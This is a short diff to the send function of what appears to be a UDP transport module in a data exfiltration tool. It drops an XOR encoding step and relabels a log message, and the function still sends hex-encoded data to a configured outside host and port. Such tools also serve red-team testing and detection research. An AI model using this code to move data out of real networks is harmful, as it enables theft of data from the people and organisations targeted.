@@ -8,9 +8,8 @@ app_exfiltrate = None
 def send(data):
     target = config['target']
     port = config['port']
-    data = app_exfiltrate.xor(data)
     app_exfiltrate.log_message(
-        'info', "[tcp] Sending {0} bytes to {1}".format(len(data), target))
+        'info', "[udp] Sending {0} bytes to {1}".format(len(data), target))
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     client_socket.sendto(data.encode('hex'), (target, port))
 
